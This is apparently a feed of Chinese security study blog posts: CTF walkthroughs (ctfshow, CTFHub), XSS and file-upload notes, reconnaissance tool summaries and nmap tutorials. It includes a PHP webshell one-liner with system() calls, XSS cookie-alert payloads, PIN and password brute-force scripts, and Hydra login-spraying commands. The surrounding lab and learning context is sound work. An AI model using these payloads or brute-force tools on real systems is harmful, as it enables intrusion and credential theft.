代码版本管理工具\nweb9: 本题目的是让答题者了解到vim编辑器使用时会有一个缓存文件，这个缓存文件在保存时进行删除，但是在vim意外退出时这个缓存文件，会以源文件加一个.swp后缀进行保存，我们可以尝试访问这些文件来尝试获取一些文件。\n/index.php.swp\nweb10:network cookie\n本题目是让答题者了解到cookie，cookie一般用于在身份认证的过程中保存一些信息，用于服务器来验证身份,在测试中可以尝试注入等方式。可以使用burp/F12中的网络来查看\nweb11:dns查找域名\nweb12:查看robots.txt文件，用户名admin。密码：在页面的最下方 管理员界面：/admin\nweb13:/document.pdf，底部信息\n本题目的是答题者了解到很多的文章有许多的文档，可以在这些文档中发现很多信息，例如文件中有许多的信息泄露的地方，本题在底部的document这个这个文本中记录到有地址和密码。\nweb14:根据提示 泄露重要(editor)的信息 直接在url后面添加/editor 然后查看flag路径并且访问\nweb15:/admin 忘记密码，密保问题。首先，在网页最下方发现一个邮箱，于是就去QQ上搜索了一下QQ号，只是发现了一个账号，地点是陕西西安，社工搜索，telegram暗精灵\nweb16:考察PHP探针php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。 url后缀名添加/tz.php 版本是雅黑PHP探针，然后查看phpinfo搜索flag\nweb17:/backup.sql 备份的sql文件\nweb18:这是一个javascript 的游戏，游戏的目的就是让要赢，从js代码中可知，当score\u0026gt;120时，且game_over这个参数为false时，即可赢，于是打开开发者模式中的console，直接赋值score=130 game_over=false 然后，执行游戏 的run() 即可得到 \u0026ldquo;你赢了，去幺幺零点皮爱吃皮看看\u0026rdquo;， 即，110.php 打开它，即得flag\nweb19:js查看源码，得知post提交账户密码，用hackbar\nweb20：mdb文件是早期asp+access构架的数据库文件 直接查看url路径添加/db/db.mdb 下载文件通过txt打开或者通过EasyAccess.exe打开搜索flag flag{ctfshow_old_database}\nweb89\nisset() 用于检查 $_GET['num'] 是否存在。如果变量存在且值不为 NULL，则返回 true，否则返回 false。 preg_match() 用于检查 $_GET['num'] 是否包含数字字符。如果模式匹配到，则返回 1，否则返回 0。 intval() 用于将 $_GET['num'] 转换为整数并检查其是否为非零值。返回变量的整数值 利用数组绕过正则表达式，?num[]=1\nweb90\n绕过十进制，我采用转换成16进制方法，?num=0x117c\nweb91\n正则表达式修饰符\n1 /^php$/im /^php$/：匹配字符串 \u0026ldquo;php\u0026rdquo;。 i：忽略大小写。 m：多行匹配，若存在换行\\n且有开始^或结束$，以换行为分隔符，逐行匹配 1 %0A` 表示换行符（`\\n payload：?cmd=%0aphp\nweb92\n方法一:intval()函数如果$base为0则$var中存在字母的话遇到字母就停止读取 但是e这个字母比较特殊，可以在PHP中不是科学计数法。所以为了绕过前面的==4476我们就可以构造 4476e123 其实不需要是e其他的字母也可以\n方法二:同web90\nweb93\n既然不能有字母，传换成八进制，?num=010574\nweb94\n在93的基础上过滤了开头为0的数字 这样的话就不能使用进制转换来进行操作 我们可以使用小数点来进行操作。这样通过intval()函数就可以变为int类型的4476 ?num=4476.0\n1 if(!strpos($num, \u0026#34;0\u0026#34;))//0不能放在第一位 web95\n1 if(preg_match(\u0026#34;/[a-z]|\\./i\u0026#34;, $num))//点匹配没了 可以通过8进制绕过但是前面必须多加一个字节 ?num=+010574或者?num=%2b010574\nweb96\n在linux下面表示当前目录是 ./ 所以我们的payload： u=./flag.php\n不能直接?u=flag.php会被过滤\nweb97（这题不太懂其实）\nmd5绕过原理：md5对数组是不予加密的，但是这个函数是返回值类型的，没有返回对象，便是返回null（null是无对象的意思，可以理解为没有目标）,所以两个都是null，可以绕过里面的比较，但是外面还有一个a!=b,绕过姿势为：?a[]=1\u0026amp;b[]=2\nweb98\n三元运算符，if使用\n(expr1)?(expr2)：(expr3)\n如果expr1成立，则执行expr2，否则执行expr3\n1 $_GET=\u0026amp;$_POST;//只要有输入的get参数就将get方法改变为post方法 我们只需要 GET一个?HTTP_FLAG=flag 加 POST一个HTTP_FLAG=flag,get直接url？，post用hackbar\nweb99\nfile_put_contents()写入文件\n1 弱类型中当php字符串和int比较时,字符串会被转换成int，所以 字符串中数字后面的字符串会被忽略。题目中的in_array没有设置type,我们可以输入字符串5.php(此处数字随意，只要在rand(1,0x36d)之间即可),转换之后也就是5,明显是在题目中生成的数组中的,满足条件，同时进入下一步后，我们就可将一句话木马写入了5.php中 get:?n=5.php post:content=\u003c?php @eval=$_POST=['hack'];?\u003e\n查看post:content=\u003c?php system('ls');?\u003e ,查看flag：content=\u003c?php system('tac flag36d.php');?\u003e\nweb100\n三个参数 v1 ，v2 ，v3，其中v0 实际上只会去判断v1是否为数字 ，因此v1 = 1234 数字即可\n1 2 3 4 5 6 7 8 9 if($v0){ if(!preg_match(\u0026#34;/\\;/\u0026#34;, $v2)){ # 表示v2中不能有符号 ； if(preg_match(\u0026#34;/\\;/\u0026#34;, $v3)){ #表示v3 中必须要有 ; eval(\u0026#34;$v2(\u0026#39;ctfshow\u0026#39;)$v3\u0026#34;); # 这里是eval中 拼接v2 v3 } } } v2=var_dump($ctfshow)/* v3=*/; 拼接起来就是var_dump($ctfshow)/ (\u0026lsquo;ctfshow\u0026rsquo;) / ; 可以执行\nv2 也可以用其他显示输出的函数\n1 v2=print_r($ctfshow)/*\u0026amp;v3=*/; 注意拼接之后要把v3注释掉，flag要把02xd换成-\n","date":"2025-02-14T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/ctfshow%E9%80%9A%E5%85%B3/","title":"ctfshow通关"},{"content":"HTTP请求：抓包，把GET换成CTFHUB\n302跳转：网页临时移动到新的位置，而浏览器的缓存没有更新，flag在index.php下而跳转到index.html打开burp suite抓包，发送请求\ncookie:验证身份 抓包repeater模块改成admin=1发送请求\n基础认证：burpsuite字典爆破，加密\nsql注入：结合burpsuite（前端没有回显），hackbar\nXSS攻击 找一个xss网站，我找的是xssaq.com\n反射型XSS 恶意JavaScript脚本属于用户发送给网站请求中的一部分，随后网站又将这部分返回给用户，恶意脚本在页面中被执行。一般发生在前后端一体的应用中，服务端逻辑会改变最终的网页代码。\n攻击步骤\n1.攻击者构造出特殊的 URL，其中包含恶意代码。 2.用户打开带有恶意代码的 URL 时，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器。 3.用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。 4.恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。\n由于HTML文档具有扁平的、串行的结构，混合了控制语句、格式和实际内容，因此在结果页面中包含任何未经验证的用户提供的数据而没有进行正确的HTML编码，可能导致标记注入。一个经典的潜在攻击向量例子是站点搜索引擎：如果用户搜索一个字符串，搜索字符串通常会在结果页面上逐字显示，以表明搜索内容。如果该响应没有正确转义或拒绝HTML控制字符，就会导致跨站脚本漏洞。\n反射型攻击通常通过电子邮件或一个中立的网站传递。诱饵是一个看似无害的URL，指向一个可信赖的网站，但包含XSS攻击向量。如果该可信赖的网站对该向量存在漏洞，点击链接可能会导致受害者的浏览器执行注入的脚本。\n这里用最经典的paylaod来进行判断是否存在xss\n1 \u0026#34;\u0026#34;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\u0026#34;\u0026#34;//这是语句是让浏览器弹框 题目中第二个输入框模拟受害者访问，这里的payload需要从xss平台中复制\n在XSS网站上\n存储型XSS 黑客将恶意 JavaScript 脚本长期保存在服务端数据库中，用户一旦访问相关页面数据，恶意脚本就会被执行。常见于搜索、微博、社区贴吧评论等。 存储型 XSS 的攻击步骤：\n1.攻击者将恶意代码提交到目标网站的数据库中。 2.用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在 HTML 中返回给浏览器。 3.用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。 4.恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。\n和上面的是一样的，存储型就是把恶意代码存储进了数据库，每次查库就会触发恶意代码。\nDOM型XSS攻击 DOM 型 XSS 攻击，实际上就是网站前端 JavaScript 代码本身不够严谨，把不可信的数据当作代码执行了。\n在使用 .innerHTML、.outerHTML、document.write() 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用 .textContent、.setAttribute() 等\nDOM 型 XSS 攻击，实际上就是网站前端 JavaScript 代码本身不够严谨，把不可信的数据当作代码执行了。\n在使用 .innerHTML、.outerHTML、document.write() 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用 .textContent、.setAttribute() 等 DOM型XSS的攻击步骤\n攻击者构造出特殊的 URL，其中包含恶意代码。 用户打开带有恶意代码的 URL。 用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行。 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。 简单来说就是在前端页面上寻找注入点\n通过构造html语法的闭合，将脚本输入进去，同前面一样\nDOM跳转 审查源代码\n注意！当你将类似于 \u0026lsquo;\u0026lsquo;\u0026rsquo;location.href = \u0026ldquo;javascript:alert(\u0026lsquo;xss\u0026rsquo;)\u0026rdquo;\u0026rsquo;\u0026rsquo;\u0026rsquo; 这样的代码赋值给 location.href 时，浏览器会将其解释为一种特殊的URL方案，即 “javascript:”。在这种情况下，浏览器会将后面的 JavaScript 代码作为URL的一部分进行解析，然后执行它。\n直接在网页url后面跟上代码测试反弹\n1 \u0026#39;\u0026#39;\u0026#39;javascript:alert(1)\u0026#39;\u0026#39;\u0026#39; 跟前面老步骤\n文件上传 文件上传漏洞服务端代码未对客户端上传的文件进行严格的验证，导致漏洞。非法用户可以利用上传的恶意文件控制整个网站，这个恶意文件被称为 WebShell ，也可以称为一种网页后门。 1.1常见的WebShell有哪些？\n拥有较完整功能的webshell，我们一般称为大马。 功能简易的webshell称为小马。 除此之外还存在一句话木马、菜刀马、脱库马等等的名词，是对于webShell功能或者特性的简称。 1.2 一句话木马演示\n","date":"2025-02-08T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/ctfhub-web/","title":"ctfhub-web"},{"content":"UDP TCP 客户端 服务器\nsocket实例化 socket(family,type,[protocal])协议族（默认AF_INET),,SOCK_STREAM(TCP)/SOCK_DGRAM(UDP)\ns=socket.socket()\n初始化TCP:s=socket.socket()\n初始化UDP:s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)\nsocket常用函数 服务器 s.bind((\u0026lsquo;127.0.0.1\u0026rsquo;,2345))绑定IP和端口\ns.listen(5)最大监听5个端口\nconn,address=s.accept()套字对象，客户端地址（本机）\n客户端 s.connect((\u0026ldquo;127.0.0.1\u0026rdquo;,2345))\n通用 send()\nsendall()区别在于可以完整发送TCP数据\ns.snedall(bytes(\u0026ldquo;Hello\u0026rdquo;,encoding=\u0026ldquo;utf-8\u0026rdquo;))\nrecv(bufsize)最多可以接受的数量\nsendto(string[,flag],address)使用UDP时发送数据\nrecovfrom(data,address) UDP专用，接受数据\nclose()关闭socket\nnmap实例化 nm = nmap.PortScannerAsycn()\n常见函数 scan(self,hosts=\u0026ldquo;127.0.0.1\u0026rdquo;,ports=None,arguments=\u0026quot;-sV\u0026quot;,sudo=False)\nnm.scan(\u0026ldquo;127.0.0.1\u0026rdquo;,\u0026ldquo;1-500\u0026rdquo;,\u0026quot;-sS\u0026quot;)1-500端口\nnm.all_hosts()返回被扫描的所有主机列表\nnm.command_line()返回再当前扫描中使用的命令行\nnm.csv()返回被扫描主机的csv格式的文件\nprint（nm.csv())希望看得更清楚\nnm.has_hsot检查是否有host扫描结果，返回值为false/true\nnm.scaninfo()列出扫描信息的结构\nnmp[\u0026ldquo;192.168.1.101\u0026rdquo;].hostname()获取192.168.1.1.1的主机名\nstill_scanning()是否正在扫描\nwait（2）等待时间\nstop（）停止当前扫描\n","date":"2025-02-08T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/python%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/","title":"Python渗透测试"},{"content":"DNS侦察 DNSMAP DNS枚举并保存为txt DNSRecon A:IP MX:邮箱 NS:名称服务器 TXT:文本 ​ IP地址反向查询\nfierce 目标子域名和IP 主机枚举 ATK6 枚举主机，发现新设备，发起拒绝服务攻击，利用已知漏洞；检测内网中存活的IPv6主机\nhping3 发送ICMP请求，DDoS攻击，扫描主机端口，Fin扫描\nnmap 6种端口状态，\u0026ndash;spoof-mac -伪造nmap所在主机地址，-f分段处理加大目标主机上防火墙的拦截难度，-D RND指定生成数量的伪造的随机IP地址，\u0026ndash;data-string\u0026quot;\u0026ldquo;将自定义字符串（ASCII码）插入数据包\n指纹识别 wappalyzer火狐插件\nwhatweb 修改请求消息HTTP -H：Snowwolf -U：Chrome，识别CMS,博客平台，中间件，Web框架模块，网站服务器，脚本，IP，cookie\nWAF识别 防火墙 wafw00f \u0026ndash;proxy=代理地址\n目录扫描 dirb 需要登陆后的网站 -c “Cookie：\u0026hellip;.\u0026rdquo; 隐藏攻击者主机 -a dirbuster 图形化界面 gobuster ffuf -w指定字典文件 -u url Wfuzz web应用程序的模糊测试工具，发现Web应用程序的隐藏资源 -w字典文件 \u0026ndash;hc 404 url/FUZZ ​ 枚举php文件 FUZZ.php\n​ 使用Wfuzz枚举用户名和密码\n​ -f output.html保存为html文件在浏览器种打开\n漏洞数据库 searchsploit 可以与nmap联动 nmap url -sV -oX nmap.xml//-oX将扫描结果保存到一个XML文件中用于与searchsploit工具联动，输入searchsploit \u0026ndash;nmap nmap.xml 谷歌Hacking语法\n批量寻找网站后台 inurl：\nintext：\nintitle：\n指定网站寻找后台 site： inurl:/intext:/intitle:\n指定返回文件类型 filetype：\n批量寻找目录遍历漏洞 intext：index of/admin\nintext:index of\n暴力攻击 破解PIN码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import requests ip = \u0026#34;127.0.0.1\u0026#34; # Change this to your instance IP address port = 1234 # Change this to your instance port number # Try every possible 4-digit PIN (from 0000 to 9999) for pin in range(10000): formatted_pin = f\u0026#34;{pin:04d}\u0026#34; # Convert the number to a 4-digit string (e.g., 7 becomes \u0026#34;0007\u0026#34;) print(f\u0026#34;Attempted PIN: {formatted_pin}\u0026#34;) # Send the request to the server response = requests.get(f\u0026#34;http://{ip}:{port}/pin?pin={formatted_pin}\u0026#34;) # Check if the server responds with success and the flag is found if response.ok and \u0026#39;flag\u0026#39; in response.json(): # .ok means status code is 200 (success) print(f\u0026#34;Correct PIN found: {formatted_pin}\u0026#34;) print(f\u0026#34;Flag: {response.json()[\u0026#39;flag\u0026#39;]}\u0026#34;) break 运行\npython pin-solver.py\n字典攻击 字典攻击的有效性在于它能够利用人类倾向于优先选择容易记住的密码而不是安全的密码这一倾向。尽管屡次受到警告，但许多人仍然选择基于字典单词、常用短语、名称或容易猜测的模式等现成信息的密码。这种可预测性使他们容易受到字典攻击，攻击者会系统地针对目标系统测试预定义的潜在密码列表。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 import requests ip = \u0026#34;127.0.0.1\u0026#34; # Change this to your instance IP address port = 1234 # Change this to your instance port number # Download a list of common passwords from the web and split it into lines passwords = requests.get(\u0026#34;https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/500-worst-passwords.txt\u0026#34;).text.splitlines() # Try each password from the list for password in passwords: print(f\u0026#34;Attempted password: {password}\u0026#34;) # Send a POST request to the server with the password response = requests.post(f\u0026#34;http://{ip}:{port}/dictionary\u0026#34;, data={\u0026#39;password\u0026#39;: password}) # Check if the server responds with success and contains the \u0026#39;flag\u0026#39; if response.ok and \u0026#39;flag\u0026#39; in response.json(): print(f\u0026#34;Correct password found: {password}\u0026#34;) print(f\u0026#34;Flag: {response.json()[\u0026#39;flag\u0026#39;]}\u0026#34;) break 1 python3 dictionary-solver.py Hydra 为 Hydra 构建 params 字符串 Form Parameters：这些是保存用户名和密码的基本字段。Hydra 将动态地用单词列表中的值替换这些参数中的占位符（^USER^和）。^PASS^\nAdditional Fields：如果表单包含其他隐藏字段或令牌（例如 CSRF 令牌），则它们也必须包含在params字符串中。如果它们的值随每次请求而变化，则它们可以具有静态值或动态占位符。\nSuccess Condition：这定义了 Hydra 用来识别成功登录的标准。它可以是 HTTP 状态代码（例如S=302重定向）或服务器响应中特定文本的存在或不存在（例如F=Invalid credentials或S=Welcome）。\nHydra 命令的一般结构http-post-form如下：\n1 hydra [options] target http-post-form \u0026#34;path:params:condition_string\u0026#34; 1 hydra ... http-post-form \u0026#34;/login:user=^USER^\u0026amp;pass=^PASS^:F=Invalid credentials\u0026#34; 1 hydra ... http-post-form \u0026#34;/login:user=^USER^\u0026amp;pass=^PASS^:S=302\u0026#34; 我们将使用top-usernames-shortlist.txt作为用户名列表，使用2023-200_most_used_passwords.txt作为密码列表。\n例：\n1 hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt 94.237.63.74 -s 35392 http-post-form \u0026#34;/login:user=^USER^\u0026amp;pass=^PASS^:F=Invalid credentials\u0026#34; ","date":"2025-01-20T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90/","title":"脚本小子"},{"content":"Web应用程序 缺陷 真实场景 SQL 注入 获取 Active Directory 用户名并对 VPN 或电子邮件门户执行密码喷洒攻击。 文件包含 阅读源代码以查找隐藏的页面或目录，这些页面或目录公开了可用于获取远程代码执行的附加功能。 不受限制的文件上传 允许用户上传个人资料图片的 Web 应用程序，允许上传任何类型的文件（不仅仅是图片）。可以利用此功能通过上传恶意代码来完全控制 Web 应用程序服务器。 不安全的直接对象引用（IDOR） 当与访问控制失效等缺陷相结合时，这通常可用于访问其他用户的文件或功能。例如，在浏览到 /user/701/edit-profile 等页面时编辑您的用户个人资料。如果我们可以将 更改701为702，我们就可以编辑其他用户的个人资料！ 访问控制失效 另一个示例是允许用户注册新帐户的应用程序。如果帐户注册功能设计不佳，用户可能会在注册时执行权限提升。考虑POST注册新用户时的请求，该请求提交数据username=bjones\u0026amp;password=Welcome1\u0026amp;email=bjones@inlanefreight.local\u0026amp;roleid=3。如果我们可以操纵roleid参数并将其更改为0或会怎样1？我们已经看到了这种情况的真实应用程序，并且可以快速注册管理员用户并访问 Web 应用程序的许多非预期功能。 Web程序布局 层：\n类别 描述 Web Application Infrastructure 描述 Web 应用程序按预期运行所需的组件（如数据库）的结构。由于 Web 应用程序可以设置为在单独的服务器上运行，因此了解它需要访问哪个数据库服务器至关重要。 Web Application Components 组成 Web 应用程序的组件代表与 Web 应用程序交互的所有组件。这些组件分为以下三个区域：UI/UX、Client和Server组件。 Web Application Architecture 架构包括各个 Web 应用程序组件之间的所有关系。 Web 应用程序基础设施 Client-ServerWeb 应用程序通常采用该client-server模型。服务器以客户端-服务器模型托管 Web 应用程序，并将其分发给任何尝试访问它的客户端。在这种模型中，Web 应用程序有两种类型的组件：前端组件，通常在客户端（浏览器）上解释和执行；后端组件，通常由托管服务器编译、解释和执行。 One Server如果任何托管的 Web 应用程序存在漏洞，则整个 Web 服务器都会受到漏洞。 Many Servers - One Database此模型将数据库分离到其自己的数据库服务器上，并允许 Web 应用程序的托管服务器访问数据库服务器以存储和检索数据。只要数据库分离在其自己的数据库服务器上，就可以将其视为多服务器对一个数据库和单服务器对一个数据库。这种模型的主要优势 ( from a security point of view) 是分段，其中 Web 应用程序的每个主要组件都单独放置和托管。如果一个 Web 服务器受到攻击，其他 Web 服务器不会受到直接影响。 Many Servers - Many DatabasesWeb 应用程序只能访问私有数据和跨 Web 应用程序共享的公共数据。也可以将每个 Web 应用程序的数据库托管在其单独的数据库服务器上。这种设计还被广泛用于冗余目的，因此如果任何 Web 服务器或数据库脱机，备份将代替其运行，以尽可能减少停机时间。 Web应用程序组件 `Client\nServer\n网络服务器 Web 应用程序逻辑 数据库 Services\n（微服务）\n第三方集成 Web 应用程序集成 `Functions（无服务器）\n敏感数据泄露 敏感数据泄露是指最终用户可以以明文形式获取敏感数据ctrl + u`通过 Web 代理（如）键入或查看页面源代码Burp Suite\n有时，我们可能会发现登录名credentials、hashes或其他敏感数据隐藏在网页源代码的注释中或JavaScript正在导入的外部代码中。其他敏感信息可能包括暴露的链接或目录，甚至暴露的用户信息，所有这些都可能被利用来进一步访问 Web 应用程序或 Web 应用程序的支持基础设施\nHTML注入 HTML 注入是指未经过滤的用户输入显示在页面上。这可以通过检索之前提交的代码（例如从后端数据库检索用户评论）或直接在JavaScript前端显示未经过滤的用户输入来实现。\n1 \u0026lt;a href=\u0026#34;http://www.hackthebox.com\u0026#34;\u0026gt;Click Me\u0026lt;/a\u0026gt; 跨站点脚本XSS HTML Injection漏洞通常还可用于通过注入要在客户端执行的代码来执行跨站点脚本 (XSS)攻击。一旦我们可以在受害者的机器上执行代码，我们就有可能访问受害者的帐户甚至他们的机器。在实践中与非常相似。但是，涉及注入代码以在客户端执行更高级的攻击，而不仅仅是注入 HTML 代码。主要有三种类型：\n类型 描述 Reflected XSS 当用户输入经过处理（例如搜索结果或错误消息）显示在页面上时发生。 Stored XSS 当用户输入存储在后端数据库并在检索时显示（例如，帖子或评论）时发生。 DOM XSS 当用户输入直接显示在浏览器中并写入HTMLDOM 对象（例如，易受攻击的用户名或页面标题）时发生。 1 #\u0026#34;\u0026gt;\u0026lt;img src=/ onerror=alert(document.cookie)\u0026gt; 显示当前用户的cookie\n后端服务器 软件\nWeb Server Database Development Framework Combinations Components LAMP Linux, Apache, MySQL, and PHP. WAMP Windows, Apache, MySQL, and PHP. WINS Windows, IIS, .NET, and SQL Server MAMP macOS, Apache, MySQL, and PHP. XAMPP Cross-Platform, Apache, MySQL, and PHP/PERL. 组件\nCombinations Components LAMP Linux, Apache, MySQL, and PHP. WAMP Windows, Apache, MySQL, and PHP. WINS Windows, IIS, .NET, and SQL Server MAMP macOS, Apache, MySQL, and PHP. XAMPP Cross-Platform, Apache, MySQL, and PHP/PERL. 硬件\nHTTP响应代码：\n成功的响应 200 OK 请求已成功 重定向消息 301 Moved Permanently 请求资源的 URL 已永久更改 302 Found 请求资源的 URL 已临时更改 客户端错误响应 400 Bad Request 由于语法无效，服务器无法理解请求 401 Unauthorized 未经身份验证尝试访问页面 403 Forbidden 客户端无权访问内容 404 Not Found 服务器找不到请求的资源 405 Method Not Allowed 请求方法已被服务器所知，但已被禁用，无法使用 408 Request Timeout 某些服务器会在空闲连接上发送此响应，即使客户端之前没有任何请求 服务器错误响应 500 Internal Server Error 服务器遇到了不知道如何处理的情况 502 Bad Gateway 服务器在作为网关获取处理请求所需的响应时，收到了无效响应 504 Gateway Timeout 服务器作为网关，无法及时得到响应 端口有两种类型：传输控制协议 (TCP)和用户数据报协议 (UDP) Port(s) Protocol 20/21 (TCP) FTP 22 (TCP) SSH 23 (TCP) Telnet 25 (TCP) SMTP 80 (TCP) HTTP 161 (TCP/UDP) SNMP 389 (TCP/UDP) LDAP 443 (TCP) SSL/TLS (HTTPS) 445 (TCP) SMB 3389 (TCP) RDP shell连接 shell类型 描述 Reverse shell 启动与攻击箱上的“监听器”的连接。 Bind shell “绑定”到目标主机上的特定端口并等待来自我们的攻击箱的连接。 Web shell 通过 Web 浏览器运行操作系统命令，通常不是交互式或半交互式的。它还可用于运行单个命令（即利用文件上传漏洞并上传PHP脚本来运行单个命令）。 渗透测试流程 tmux tmux new -s \u0026lt;名称\u0026gt;\n执行命令 ctrl+b+ d\n重新连接tmux attach -t \u0026lt;名称\u0026gt;\ntmux ls展示所有会话\nnmap 例：nmap 10.129.42.253\n运行 Nmap 脚本的语法是`nmap \u0026ndash;script ","date":"2025-01-14T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/","title":"Web应用程序"},{"content":" TCP扫描，默认常用 1 sudo nmap -sS localhost 发现主机 1 sudo nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d\u0026#34; \u0026#34; -f5 扫描选项 描述 10.129.2.0/24 目标网络范围。 -sn 禁用端口扫描。 -oA tnet 以名称“tnet”开头的所有格式存储结果。 Firewall and IDS Evasion此扫描方法仅在主机的防火墙允许的情况下才有效\n禁用端口扫描，则会启用ICMP扫描\n扫描IP列表 1 cat hosts.lst 这可能意味着其他主机由于其防火墙配置而忽略了默认的ICMP 回应请求Nmap。由于没有收到响应，它会将这些主机标记为非活动状态\n对预定义列表使用相同的扫描技术\n1 sudo nmap -sn -oA tnet -iL hosts.lst | grep for | cut -d\u0026#34; \u0026#34; -f5 扫描选项 描述 -sn 禁用端口扫描。 -oA tnet 以名称“tnet”开头的所有格式存储结果。 -iL 对提供的“hosts.lst”列表中的目标执行定义的扫描。 为了确保发送了 ICMP 回显请求，\nICMP 回显请求 ( -Pn)、DNS 解析 ( -n) 和 ARP ping 扫描 ( --disable-arp-ping)。 1 sudo nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d\u0026#34; \u0026#34; -f5 1 sudo nmap 10.129.2.18 -sn -oA host -PE --packet-trace 扫描选项 描述 10.129.2.18 对目标执行定义的扫描。 -sn 禁用端口扫描。 -oA host 以名称“host”开头的所有格式存储结果。 -PE 使用“ICMP Echo 请求”对目标执行 ping 扫描。 --packet-trace 显示所有发送和接收的数据包 1 sudo nmap 10.129.2.18 -sn -oA host -PE --reason 扫描选项 描述 10.129.2.18 对目标执行定义的扫描。 -sn 禁用端口扫描。 -oA host 以名称“host”开头的所有格式存储结果。 -PE 使用“ICMP Echo 请求”对目标执行 ping 扫描。 --reason 显示特定结果的原因。 主机和端口扫描 在发现目标还活着之后，我们希望更准确地了解系统。我们需要的信息包括：\n开放端口及其服务 服务版本 服务提供的信息 操作系统 扫描端口六种情况：\n状态 描述 open 这表示已建立与扫描端口的连接。这些连接可以是TCP 连接、UDP 数据报以及SCTP 关联。 closed 当端口显示为关闭时，TCP 协议会指示我们收到的数据包包含一个RST标志。这种扫描方法还可用于确定我们的目标是否还活着。 filtered Nmap 无法正确识别扫描的端口是打开还是关闭，因为目标没有返回该端口的响应，或者我们从目标收到错误代码。 unfiltered 端口的这种状态仅在TCP-ACK扫描期间发生，表示该端口可访问，但无法确定它是开放还是关闭。 `open filtered` `closed filtered` 扫描前 10 个 TCP 端口 1 sudo nmap 10.129.2.28 --top-ports=10 扫描选项 描述 10.129.2.28 扫描指定目标。 --top-ports=10 扫描已被定义为最频繁的指定顶级端口。 Nmap——跟踪数据包 1 sudo nmap 10.129.2.28 -p 21 --packet-trace -Pn -n --disable-arp-ping 扫描选项 描述 10.129.2.28 扫描指定目标。 -p 21 仅扫描指定端口。 --packet-trace 显示所有发送和接收的数据包。 -n 禁用 DNS 解析。 --disable-arp-ping 禁用 ARP ping。 信息 描述 SENT (0.0429s) 表示Nmap的SENT操作，向目标发送数据包。 TCP 显示用于与目标端口交互的协议。 10.10.14.2:63090 \u0026gt; 代表我们的 IPv4 地址和源端口，Nmap 将使用它们来发送数据包。 10.129.2.28:21 显示目标 IPv4 地址和目标端口。 S 发送的TCP数据包的SYN标志。 ttl=56 id=57322 iplen=44 seq=1699105818 win=1024 mss 1460 附加的 TCP 标头参数。 连接扫描 Nmap TCP 连接扫描( -sT) 使用 TCP 三次握手来确定目标主机上的特定端口是打开还是关闭。\n1 sudo nmap 10.129.2.28 -p 443 --packet-trace --disable-arp-ping -Pn -n --reason -sT 该Connect扫描（也称为完整 TCP 连接扫描）非常准确，因为它完成了三次 TCP 握手，使我们能够确定端口的确切状态（打开、关闭或过滤）。但是，它并不是最隐蔽的。\n过滤端口 防火墙drops会扫描我们发送的 TCP 数据包。因此，我们扫描 TCP 端口139，该端口已显示为已过滤。为了能够跟踪我们发送的数据包的处理方式，我们再次停用 ICMP 回显请求 ( -Pn)、DNS 解析 ( -n) 和 ARP ping 扫描 ( --disable-arp-ping)。\n1 sudo nmap 10.129.2.28 -p 139 --packet-trace -n --disable-arp-ping -Pn 发现开放的 UDP 端口 1 sudo nmap 10.129.2.28 -F -sU 扫描选项 描述 10.129.2.28 扫描指定目标。 -F 扫描前 100 个端口。 -sU 执行 UDP 扫描。 一些系统管理员有时会忘记过滤除 TCP 端口之外的 UDP 端口，但UDP比TCP慢的多\n这样做的另一个缺点是，我们经常得不到响应，因为Nmap向扫描的 UDP 端口发送空数据报，并且我们没有收到任何响应。所以我们无法确定 UDP 数据包是否已经到达。如果 UDP 端口为open，则只有在应用程序配置为这样做的情况下，我们才会收到响应。\n版本扫描 1 sudo nmap 10.129.2.28 -Pn -n --disable-arp-ping --packet-trace -p 445 --reason -sV 扫描选项 描述 10.129.2.28 扫描指定目标。 -Pn 禁用 ICMP Echo 请求。 -n 禁用 DNS 解析。 --disable-arp-ping 禁用 ARP ping。 --packet-trace 显示所有发送和接收的数据包。 -p 445 仅扫描指定端口。 --reason 显示端口处于特定状态的原因。 -sV 执行服务扫描。 扫描端口的另一种方便方法是-sV使用选项从开放端口获取其他可用信息。此方法可以识别版本、服务名称和有关目标的详细信息。\n保存结果 Nmap可以以 3 种不同的格式保存结果。\n正常输出（-oN）.nmap文件扩展名 带有文件扩展名的Grepable 输出（-oG）.gnmap XML 输出 ( -oX)，.xml文件扩展名 我们还可以指定选项（-oA）以所有格式保存结果。命令可能如下所示：\n1 sudo nmap 10.129.2.28 -p- -oA target 扫描选项 描述 10.129.2.28 扫描指定目标。 -p- 扫描所有端口。 -oA target 以所有格式保存结果，每个文件的名称以“目标”开头。 1 target.gnmap target.xml target.nmap 转换格式 要将存储的结果从 XML 格式转换为 HTML，我们可以使用该工具xsltproc。\n1 xsltproc target.xml -o target.html 服务枚举 服务版本检测 1 sudo nmap 10.129.2.28 -p- -sV 描选项 描述 10.129.2.28 扫描指定目标。 -p- 扫描所有端口。 -sV 对指定端口执行服务版本检测。 增加verbosity 